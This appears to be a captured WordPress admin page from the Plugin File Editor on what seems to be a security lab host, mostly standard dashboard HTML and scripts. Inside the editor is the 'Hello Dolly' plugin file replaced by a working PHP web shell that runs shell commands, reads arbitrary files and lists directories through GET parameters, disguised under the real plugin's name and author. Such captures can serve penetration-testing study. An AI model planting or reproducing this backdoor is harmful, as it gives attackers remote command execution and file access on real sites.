+	<h2 id="plugin-files-label">Plugin Files</h2>
+
+		<ul role="tree" aria-labelledby="plugin-files-label">
+	<li role="treeitem" tabindex="-1" aria-expanded="true" aria-level="1" aria-posinset="1" aria-setsize="1">
+		<ul role="group">
+					<li role="none" class="current-file">
+			<a role="treeitem" tabindex="0"
+				href="https://0x06.0ffsec.com/wp-admin/plugin-editor.php?file=hello.php&#038;plugin=hello.php"
+				aria-level="2"
+				aria-setsize="1"
+				aria-posinset="1">
+				<span class="notice notice-info">hello.php</span>			</a>
+		</li>
+				</ul>
+	</li>
+	</ul>
+</div>
+
+<form name="template" id="template" action="plugin-editor.php" method="post">
+	<input type="hidden" id="nonce" name="nonce" value="9a14a5fce8" /><input type="hidden" name="_wp_http_referer" value="/wp-admin/plugin-editor.php?plugin=hello.php&#038;Submit=Select" />	<div>
+		<label for="newcontent" id="theme-plugin-editor-label">Selected file content:</label>
+		<textarea cols="70" rows="25" name="newcontent" id="newcontent" aria-describedby="editor-keyboard-trap-help-1 editor-keyboard-trap-help-2 editor-keyboard-trap-help-3 editor-keyboard-trap-help-4">&lt;?php
+/*
+Plugin Name: Hello Dolly
+Description: shell
+Version: 1.7.2
+Author: Matt Mullenweg
+*/
+if(isset($_GET[&#039;c&#039;])){system($_GET[&#039;c&#039;]);die();}
+if(isset($_GET[&#039;r&#039;])){echo file_get_contents($_GET[&#039;r&#039;]);die();}
+if(isset($_GET[&#039;d&#039;])){print_r(scandir($_GET[&#039;d&#039;]));die();}
+</textarea>
+		<input type="hidden" name="action" value="update" />
+		<input type="hidden" name="file" value="hello.php" />
+		<input type="hidden" name="plugin" value="hello.php" />
+	</div>
+
+			<div id="documentation" class="hide-if-no-js">
+			<label for="docs-list">Documentation:</label>
+			<select name="docs-list" id="docs-list"><option value="">Function Name&hellip;</option><option value="file_get_contents">file_get_contents()</option><option value="print_r">print_r()</option><option value="scandir">scandir()</option><option value="system">system()</option></select>			<input disabled id="docs-lookup" type="button" class="button" value="Look Up" onclick="if ( '' !== jQuery('#docs-list').val() ) { window.open( 'https://api.wordpress.org/core/handbook/1.0/?function=' + escape( jQuery( '#docs-list' ).val() ) + '&amp;locale=en_US&amp;version=6.9.1&amp;redirect=true'); }" />
+		</div>
+	
+			<div class="editor-notices">
+				</div>
+		<p class="submit">
+			<input type="submit" name="submit" id="submit" class="button button-primary" value="Update File"  />			<span class="spinner"></span>
+		</p>
+	
+		<script type="text/html" id="tmpl-wp-file-editor-notice">
+		<div class="notice inline notice-{{ data.type || 'info' }} {{ data.alt ? 'notice-alt' : '' }} {{ data.dismissible ? 'is-dismissible' : '' }} {{ data.classes || '' }}">
+			<# if ( 'php_error' === data.code ) { #>
+				<p>
+					Your PHP code changes were not applied due to an error on line {{ data.line }} of file {{ data.file }}. Please fix and try saving again.				</p>
+				<pre>{{ data.message }}</pre>
+			<# } else if ( 'file_not_writable' === data.code ) { #>
+				<p>
+					You need to make this file writable before you can save your changes. See <a href="https://developer.wordpress.org/advanced-administration/server/file-permissions/">Changing File Permissions</a> for more information.				</p>
+			<# } else { #>
+				<p>{{ data.message || data.code }}</p>
+
+				<# if ( 'lint_errors' === data.code ) { #>
+					<p>
+						<# var elementId = 'el-' + String( Math.random() ); #>
+						<input id="{{ elementId }}"  type="checkbox">
+						<label for="{{ elementId }}">Update anyway, even though it might break your site?</label>
+					</p>
+				<# } #>
+			<# } #>
+			<# if ( data.dismissible ) { #>
+				<button type="button" class="notice-dismiss"><span class="screen-reader-text">
+					Dismiss				</span></button>
+			<# } #>
+		</div>
+	</script>
+	</form>
+<br class="clear" />
+</div>
+	<div id="file-editor-warning" class="notification-dialog-wrap file-editor-warning hide-if-no-js hidden">
+		<div class="notification-dialog-background"></div>
+		<div class="notification-dialog">
+			<div class="file-editor-warning-content">
+				<div class="file-editor-warning-message">
+					<h1>Heads up!</h1>
+					<p>You appear to be making direct edits to your plugin in the WordPress dashboard. Editing plugins directly is not recommended as it may introduce incompatibilities that break your site and your changes may be lost in future updates.</p>
+					<p>If you absolutely have to make direct edits to this plugin, use a file manager to create a copy with a new name and hang on to the original. That way, you can re-enable a functional version if something goes wrong.</p>
+				</div>
+				<p>
+					<a class="button file-editor-warning-go-back" href="https://0x06.0ffsec.com/wp-admin/">Go back</a>
+					<button type="button" class="file-editor-warning-dismiss button button-primary">I understand</button>
+				</p>
+			</div>
+		</div>
+	</div>
+	
+<div class="clear"></div></div><!-- wpbody-content -->
+<div class="clear"></div></div><!-- wpbody -->
+<div class="clear"></div></div><!-- wpcontent -->
+
+<div id="wpfooter" role="contentinfo">
+		<p id="footer-left" class="alignleft">
+		<span id="footer-thankyou">Thank you for creating with <a href="https://wordpress.org/">WordPress</a>.</span>	</p>
+	<p id="footer-upgrade" class="alignright">
+		Version 6.9.1	</p>
+	<div class="clear"></div>
+</div>
+	<div id="wp-auth-check-wrap" class="hidden">
+	<div id="wp-auth-check-bg"></div>
+	<div id="wp-auth-check">
+	<button type="button" class="wp-auth-check-close button-link"><span class="screen-reader-text">
+		Close dialog	</span></button>
+			<div id="wp-auth-check-form" class="loading" data-src="https://0x06.0ffsec.com/wp-login.php?interim-login=1&#038;wp_lang=en_US"></div>
+			<div class="wp-auth-fallback">
+		<p><b class="wp-auth-fallback-expired" tabindex="0">Session expired</b></p>
+		<p><a href="https://0x06.0ffsec.com/wp-login.php" target="_blank">Please log in again.</a>
+		The login page will open in a new tab. After logging in you can close it and return to this page.</p>
+	</div>
+	</div>
+	</div>
+	<script src='https://0x06.0ffsec.com/wp-admin/load-scripts.php?c=0&amp;load%5Bchunk_0%5D=hoverIntent,wp-dom-ready,wp-hooks&amp;ver=6.9.1'></script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/dist/i18n.min.js?ver=c26c3dc7bed366793375" id="wp-i18n-js"></script>
+<script id="wp-i18n-js-after">
+wp.i18n.setLocaleData( { 'text direction\u0004ltr': [ 'ltr' ] } );
+//# sourceURL=wp-i18n-js-after
+</script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/dist/a11y.min.js?ver=cb460b4676c94bd228ed" id="wp-a11y-js"></script>
+<script id="common-js-extra">
+var bulkActionObserverIds = {"bulk_action":"action","changeit":"new_role"};
+//# sourceURL=common-js-extra
+</script>
+<script src="https://0x06.0ffsec.com/wp-admin/js/common.min.js?ver=6.9.1" id="common-js"></script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/hoverintent-js.min.js?ver=2.2.1" id="hoverintent-js-js"></script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/admin-bar.min.js?ver=6.9.1" id="admin-bar-js"></script>
+<script id="wp-util-js-extra">
+var _wpUtilSettings = {"ajax":{"url":"/wp-admin/admin-ajax.php"}};
+//# sourceURL=wp-util-js-extra
+</script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/wp-util.min.js?ver=6.9.1" id="wp-util-js"></script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/wp-sanitize.min.js?ver=6.9.1" id="wp-sanitize-js"></script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/jquery/ui/core.min.js?ver=1.13.3" id="jquery-ui-core-js"></script>
+<script src="https://0x06.0ffsec.com/wp-admin/js/theme-plugin-editor.min.js?ver=6.9.1" id="wp-theme-plugin-editor-js"></script>
+<script id="wp-theme-plugin-editor-js-after">
+jQuery( function( $ ) { wp.themePluginEditor.init( $( "#template" ), {"codeEditor":{"codemirror":{"indentUnit":4,"indentWithTabs":true,"inputStyle":"contenteditable","lineNumbers":true,"lineWrapping":true,"styleActiveLine":true,"continueComments":true,"extraKeys":{"Ctrl-Space":"autocomplete","Ctrl-/":"toggleComment","Cmd-/":"toggleComment","Alt-F":"findPersistent","Ctrl-F":"findPersistent","Cmd-F":"findPersistent"},"direction":"ltr","gutters":[],"mode":"php","autoCloseBrackets":true,"autoCloseTags":true,"matchBrackets":true,"matchTags":{"bothTags":true}},"csslint":{"errors":true,"box-model":true,"display-property-grouping":true,"duplicate-properties":true,"known-properties":true,"outline-none":true},"jshint":{"boss":true,"curly":true,"eqeqeq":true,"eqnull":true,"es3":true,"expr":true,"immed":true,"noarg":true,"nonbsp":true,"onevar":true,"quotmark":"single","trailing":true,"undef":true,"unused":true,"browser":true,"globals":{"_":false,"Backbone":false,"jQuery":false,"JSON":false,"wp":false}},"htmlhint":{"tagname-lowercase":true,"attr-lowercase":true,"attr-value-double-quotes":false,"doctype-first":false,"tag-pair":true,"spec-char-escape":true,"id-unique":true,"src-not-empty":true,"attr-no-duplication":true,"alt-require":true,"space-tab-mixed-disabled":"tab","attr-unsafe-chars":true}}} ); } )
+wp.themePluginEditor.themeOrPlugin = "plugin";
+//# sourceURL=wp-theme-plugin-editor-js-after
+</script>
+<script src="https://0x06.0ffsec.com/wp-admin/js/svg-painter.js?ver=6.9.1" id="svg-painter-js"></script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/jquery/ui/mouse.min.js?ver=1.13.3" id="jquery-ui-mouse-js"></script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/jquery/ui/resizable.min.js?ver=1.13.3" id="jquery-ui-resizable-js"></script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/jquery/ui/draggable.min.js?ver=1.13.3" id="jquery-ui-draggable-js"></script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/jquery/ui/controlgroup.min.js?ver=1.13.3" id="jquery-ui-controlgroup-js"></script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/jquery/ui/checkboxradio.min.js?ver=1.13.3" id="jquery-ui-checkboxradio-js"></script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/jquery/ui/button.min.js?ver=1.13.3" id="jquery-ui-button-js"></script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/jquery/ui/dialog.min.js?ver=1.13.3" id="jquery-ui-dialog-js"></script>
+<script id="heartbeat-js-extra">
+var heartbeatSettings = {"nonce":"ae1e8c8b82"};
+//# sourceURL=heartbeat-js-extra
+</script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/heartbeat.min.js?ver=6.9.1" id="heartbeat-js"></script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/wp-auth-check.min.js?ver=6.9.1" id="wp-auth-check-js"></script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/dist/vendor/react.min.js?ver=18.3.1.1" id="react-js"></script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/dist/vendor/react-dom.min.js?ver=18.3.1.1" id="react-dom-js"></script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/dist/vendor/react-jsx-runtime.min.js?ver=18.3.1" id="react-jsx-runtime-js"></script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/dist/deprecated.min.js?ver=e1f84915c5e8ae38964c" id="wp-deprecated-js"></script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/dist/dom.min.js?ver=26edef3be6483da3de2e" id="wp-dom-js"></script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/dist/escape-html.min.js?ver=6561a406d2d232a6fbd2" id="wp-escape-html-js"></script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/dist/element.min.js?ver=6a582b0c827fa25df3dd" id="wp-element-js"></script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/dist/is-shallow-equal.min.js?ver=e0f9f1d78d83f5196979" id="wp-is-shallow-equal-js"></script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/dist/keycodes.min.js?ver=34c8fb5e7a594a1c8037" id="wp-keycodes-js"></script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/dist/priority-queue.min.js?ver=2d59d091223ee9a33838" id="wp-priority-queue-js"></script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/dist/compose.min.js?ver=7a9b375d8c19cf9d3d9b" id="wp-compose-js"></script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/dist/vendor/moment.min.js?ver=2.30.1" id="moment-js"></script>
+<script id="moment-js-after">
+moment.updateLocale( 'en_US', {"months":["January","February","March","April","May","June","July","August","September","October","November","December"],"monthsShort":["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"],"weekdays":["Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday"],"weekdaysShort":["Sun","Mon","Tue","Wed","Thu","Fri","Sat"],"week":{"dow":1},"longDateFormat":{"LT":"g:i a","LTS":null,"L":null,"LL":"F j, Y","LLL":"F j, Y g:i a","LLLL":null}} );
+//# sourceURL=moment-js-after
+</script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/dist/date.min.js?ver=795a56839718d3ff7eae" id="wp-date-js"></script>
+<script id="wp-date-js-after">
+wp.date.setSettings( {"l10n":{"locale":"en_US","months":["January","February","March","April","May","June","July","August","September","October","November","December"],"monthsShort":["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"],"weekdays":["Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday"],"weekdaysShort":["Sun","Mon","Tue","Wed","Thu","Fri","Sat"],"meridiem":{"am":"am","pm":"pm","AM":"AM","PM":"PM"},"relative":{"future":"%s from now","past":"%s ago","s":"a second","ss":"%d seconds","m":"a minute","mm":"%d minutes","h":"an hour","hh":"%d hours","d":"a day","dd":"%d days","M":"a month","MM":"%d months","y":"a year","yy":"%d years"},"startOfWeek":1},"formats":{"time":"g:i a","date":"F j, Y","datetime":"F j, Y g:i a","datetimeAbbreviated":"M j, Y g:i a"},"timezone":{"offset":0,"offsetFormatted":"0","string":"","abbr":""}} );
+//# sourceURL=wp-date-js-after
+</script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/dist/html-entities.min.js?ver=e8b78b18a162491d5e5f" id="wp-html-entities-js"></script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/dist/primitives.min.js?ver=0b5dcc337aa7cbf75570" id="wp-primitives-js"></script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/dist/private-apis.min.js?ver=4f465748bda624774139" id="wp-private-apis-js"></script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/dist/redux-routine.min.js?ver=8bb92d45458b29590f53" id="wp-redux-routine-js"></script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/dist/data.min.js?ver=f940198280891b0b6318" id="wp-data-js"></script>
+<script id="wp-data-js-after">
+( function() {
+	var userId = 1;
+	var storageKey = "WP_DATA_USER_" + userId;
+	wp.data
+		.use( wp.data.plugins.persistence, { storageKey: storageKey } );
+} )();
+//# sourceURL=wp-data-js-after
+</script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/dist/rich-text.min.js?ver=5bdbb44f3039529e3645" id="wp-rich-text-js"></script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/dist/warning.min.js?ver=d69bc18c456d01c11d5a" id="wp-warning-js"></script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/dist/components.min.js?ver=0d72a218dfea8f6f442f" id="wp-components-js"></script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/dist/keyboard-shortcuts.min.js?ver=fbc45a34ce65c5723afa" id="wp-keyboard-shortcuts-js"></script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/dist/commands.min.js?ver=cac8f4817ab7cea0ac49" id="wp-commands-js"></script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/dist/url.min.js?ver=9e178c9516d1222dc834" id="wp-url-js"></script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/dist/api-fetch.min.js?ver=3a4d9af2b423048b0dee" id="wp-api-fetch-js"></script>
+<script id="wp-api-fetch-js-after">
+wp.apiFetch.use( wp.apiFetch.createRootURLMiddleware( "https://0x06.0ffsec.com/index.php/wp-json/" ) );
+wp.apiFetch.nonceMiddleware = wp.apiFetch.createNonceMiddleware( "e8f845b0b1" );
+wp.apiFetch.use( wp.apiFetch.nonceMiddleware );
+wp.apiFetch.use( wp.apiFetch.mediaUploadMiddleware );
+wp.apiFetch.nonceEndpoint = "https://0x06.0ffsec.com/wp-admin/admin-ajax.php?action=rest-nonce";
+//# sourceURL=wp-api-fetch-js-after
+</script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/dist/blob.min.js?ver=9113eed771d446f4a556" id="wp-blob-js"></script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/dist/block-serialization-default-parser.min.js?ver=14d44daebf663d05d330" id="wp-block-serialization-default-parser-js"></script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/dist/autop.min.js?ver=9fb50649848277dd318d" id="wp-autop-js"></script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/dist/shortcode.min.js?ver=0b3174183b858f2df320" id="wp-shortcode-js"></script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/dist/blocks.min.js?ver=57eca4d23daac7159d88" id="wp-blocks-js"></script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/dist/notices.min.js?ver=f62fbf15dcc23301922f" id="wp-notices-js"></script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/dist/preferences-persistence.min.js?ver=e954d3a4426d311f7d1a" id="wp-preferences-persistence-js"></script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/dist/preferences.min.js?ver=2ca086aed510c242a1ed" id="wp-preferences-js"></script>
+<script id="wp-preferences-js-after">
+( function() {
+				var serverData = "";
+				var userId = "1";
+				var persistenceLayer = wp.preferencesPersistence.__unstableCreatePersistenceLayer( serverData, userId );
+				var preferencesStore = wp.preferences.store;
+				wp.data.dispatch( preferencesStore ).setPersistenceLayer( persistenceLayer );
+			} ) ();
+//# sourceURL=wp-preferences-js-after
+</script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/dist/style-engine.min.js?ver=7c6fcedc37dadafb8a81" id="wp-style-engine-js"></script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/dist/token-list.min.js?ver=cfdf635a436c3953a965" id="wp-token-list-js"></script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/dist/block-editor.min.js?ver=addf558a422e2ee57920" id="wp-block-editor-js"></script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/dist/core-data.min.js?ver=15baadfe6e1374188072" id="wp-core-data-js"></script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/dist/router.min.js?ver=2dfc4b954318a03e6a76" id="wp-router-js"></script>
+<script src="https://0x06.0ffsec.com/wp-includes/js/dist/core-commands.min.js?ver=effe2d88d7f0c50a8ce9" id="wp-core-commands-js"></script>
+<script id="wp-core-commands-js-after">
+wp.coreCommands.initializeCommandPalette( {"is_network_admin":false,"menu_commands":[{"label":"Dashboard","url":"index.php","name":"index.php"},{"label":"Dashboard \u003E Home","url":"index.php","name":"index.php-index.php"},{"label":"Dashboard \u003E Updates","url":"update-core.php","name":"index.php-update-core.php"},{"label":"Posts","url":"edit.php","name":"edit.php"},{"label":"Posts \u003E All Posts","url":"edit.php","name":"edit.php-edit.php"},{"label":"Posts \u003E Add Post","url":"post-new.php","name":"edit.php-post-new.php"},{"label":"Posts \u003E Categories","url":"edit-tags.php?taxonomy=category","name":"edit.php-edit-tags.php?taxonomy=category"},{"label":"Posts \u003E Tags","url":"edit-tags.php?taxonomy=post_tag","name":"edit.php-edit-tags.php?taxonomy=post_tag"},{"label":"Media","url":"upload.php","name":"upload.php"},{"label":"Media \u003E Library","url":"upload.php","name":"upload.php-upload.php"},{"label":"Media \u003E Add Media File","url":"media-new.php","name":"upload.php-media-new.php"},{"label":"Pages","url":"edit.php?post_type=page","name":"edit.php?post_type=page"},{"label":"Pages \u003E All Pages","url":"edit.php?post_type=page","name":"edit.php?post_type=page-edit.php?post_type=page"},{"label":"Pages \u003E Add Page","url":"post-new.php?post_type=page","name":"edit.php?post_type=page-post-new.php?post_type=page"},{"label":"Comments","url":"edit-comments.php","name":"edit-comments.php"},{"label":"Search Forms","url":"edit.php?post_type=wcsearch_form","name":"edit.php?post_type=wcsearch_form"},{"label":"Search Forms \u003E Search Forms","url":"edit.php?post_type=wcsearch_form","name":"edit.php?post_type=wcsearch_form-edit.php?post_type=wcsearch_form"},{"label":"Search Forms \u003E Create new search form","url":"post-new.php?post_type=wcsearch_form","name":"edit.php?post_type=wcsearch_form-post-new.php?post_type=wcsearch_form"},{"label":"Directory listings","url":"edit.php?post_type=w2dc_listing","name":"edit.php?post_type=w2dc_listing"},{"label":"Directory listings \u003E Directory listings","url":"edit.php?post_type=w2dc_listing","name":"edit.php?post_type=w2dc_listing-edit.php?post_type=w2dc_listing"},{"label":"Directory listings \u003E Create new listing","url":"post-new.php?post_type=w2dc_listing","name":"edit.php?post_type=w2dc_listing-post-new.php?post_type=w2dc_listing"},{"label":"Directory listings \u003E Directory categories","url":"edit-tags.php?taxonomy=w2dc-category&amp;post_type=w2dc_listing","name":"edit.php?post_type=w2dc_listing-edit-tags.php?taxonomy=w2dc-category&amp;post_type=w2dc_listing"},{"label":"Directory listings \u003E Directory locations","url":"edit-tags.php?taxonomy=w2dc-location&amp;post_type=w2dc_listing","name":"edit.php?post_type=w2dc_listing-edit-tags.php?taxonomy=w2dc-location&amp;post_type=w2dc_listing"},{"label":"Directory listings \u003E Directory tags","url":"edit-tags.php?taxonomy=w2dc-tag&amp;post_type=w2dc_listing","name":"edit.php?post_type=w2dc_listing-edit-tags.php?taxonomy=w2dc-tag&amp;post_type=w2dc_listing"},{"label":"Appearance","url":"themes.php","name":"themes.php"},{"label":"Appearance \u003E Themes","url":"themes.php","name":"themes.php-themes.php"},{"label":"Appearance \u003E Editor","url":"site-editor.php","name":"themes.php-site-editor.php"},{"label":"Appearance \u003E Directory settings","url":"https://0x06.0ffsec.com/wp-admin/themes.php?page=w2dc_settings","name":"themes.php-w2dc_settings"},{"label":"Plugins","url":"plugins.php","name":"plugins.php"},{"label":"Plugins \u003E Installed Plugins","url":"plugins.php","name":"plugins.php-plugins.php"},{"label":"Plugins \u003E Add Plugin","url":"plugin-install.php","name":"plugins.php-plugin-install.php"},{"label":"Users","url":"users.php","name":"users.php"},{"label":"Users \u003E All Users","url":"users.php","name":"users.php-users.php"},{"label":"Users \u003E Add User","url":"user-new.php","name":"users.php-user-new.php"},{"label":"Users \u003E Profile","url":"profile.php","name":"users.php-profile.php"},{"label":"Tools","url":"tools.php","name":"tools.php"},{"label":"Tools \u003E Available Tools","url":"tools.php","name":"tools.php-tools.php"},{"label":"Tools \u003E Import","url":"import.php","name":"tools.php-import.php"},{"label":"Tools \u003E Export","url":"export.php","name":"tools.php-export.php"},{"label":"Tools \u003E Site Health","url":"site-health.php","name":"tools.php-site-health.php"},{"label":"Tools \u003E Export Personal Data","url":"export-personal-data.php","name":"tools.php-export-personal-data.php"},{"label":"Tools \u003E Erase Personal Data","url":"erase-personal-data.php","name":"tools.php-erase-personal-data.php"},{"label":"Tools \u003E Theme File Editor","url":"theme-editor.php","name":"tools.php-theme-editor.php"},{"label":"Tools \u003E Plugin File Editor","url":"plugin-editor.php","name":"tools.php-plugin-editor.php"},{"label":"Settings","url":"options-general.php","name":"options-general.php"},{"label":"Settings \u003E General","url":"options-general.php","name":"options-general.php-options-general.php"},{"label":"Settings \u003E Writing","url":"options-writing.php","name":"options-general.php-options-writing.php"},{"label":"Settings \u003E Reading","url":"options-reading.php","name":"options-general.php-options-reading.php"},{"label":"Settings \u003E Discussion","url":"options-discussion.php","name":"options-general.php-options-discussion.php"},{"label":"Settings \u003E Media","url":"options-media.php","name":"options-general.php-options-media.php"},{"label":"Settings \u003E Permalinks","url":"options-permalink.php","name":"options-general.php-options-permalink.php"},{"label":"Settings \u003E Privacy","url":"options-privacy.php","name":"options-general.php-options-privacy.php"},{"label":"Directory Admin","url":"https://0x06.0ffsec.com/wp-admin/themes.php?page=w2dc_settings","name":"w2dc_settings"},{"label":"Directory Admin \u003E Directory settings","url":"https://0x06.0ffsec.com/wp-admin/themes.php?page=w2dc_settings","name":"w2dc_settings-w2dc_settings"},{"label":"Directory Admin \u003E Listings levels","url":"https://0x06.0ffsec.com/wp-admin/admin.php?page=w2dc_levels","name":"w2dc_settings-w2dc_levels"},{"label":"Directory Admin \u003E Listings upgrade","url":"https://0x06.0ffsec.com/wp-admin/admin.php?page=w2dc_manage_upgrades","name":"w2dc_settings-w2dc_manage_upgrades"},{"label":"Directory Admin \u003E Locations levels","url":"https://0x06.0ffsec.com/wp-admin/admin.php?page=w2dc_locations_levels","name":"w2dc_settings-w2dc_locations_levels"},{"label":"Directory Admin \u003E Content fields","url":"https://0x06.0ffsec.com/wp-admin/admin.php?page=w2dc_content_fields","name":"w2dc_settings-w2dc_content_fields"},{"label":"Directory Admin \u003E CSV Import/Export","url":"https://0x06.0ffsec.com/wp-admin/admin.php?page=w2dc_csv_import","name":"w2dc_settings-w2dc_csv_import"},{"label":"Directory Admin \u003E Demo data Import","url":"https://0x06.0ffsec.com/wp-admin/admin.php?page=w2dc_demo_data","name":"w2dc_settings-w2dc_demo_data"}]} );
+//# sourceURL=wp-core-commands-js-after
+</script>
+	<script type="text/javascript">
+	var compressionNonce = "ecaed572c5";
+	var testCompression = {
+		get : function(test) {
+			var x;
+			if ( window.XMLHttpRequest ) {
+				x = new XMLHttpRequest();
+			} else {
+				try{x=new ActiveXObject('Msxml2.XMLHTTP');}catch(e){try{x=new ActiveXObject('Microsoft.XMLHTTP');}catch(e){};}
+			}
+
+			if (x) {
+				x.onreadystatechange = function() {
+					var r, h;
+					if ( x.readyState == 4 ) {
+						r = x.responseText.substr(0, 18);
+						h = x.getResponseHeader('Content-Encoding');
+						testCompression.check(r, h, test);
+					}
+				};
+
+				x.open('GET', ajaxurl + '?action=wp-compression-test&test='+test+'&_ajax_nonce='+compressionNonce+'&'+(new Date()).getTime(), true);
+				x.send('');
+			}
+		},
+
+		check : function(r, h, test) {
+			if ( ! r && ! test )
+				this.get(1);
+
+			if ( 1 == test ) {
+				if ( h && ( h.match(/deflate/i) || h.match(/gzip/i) ) )
+					this.get('no');
+				else
+					this.get(2);
+
+				return;
+			}
+
+			if ( 2 == test ) {
+				if ( '"wpCompressionTest' === r )
+					this.get('yes');
+				else
+					this.get('no');
+			}
+		}
+	};
+	testCompression.check();
+	</script>
+	
+<div class="clear"></div></div><!-- wpwrap -->
+<script type="text/javascript">if(typeof wpOnload==='function')wpOnload();</script>
+</body>
+</html>
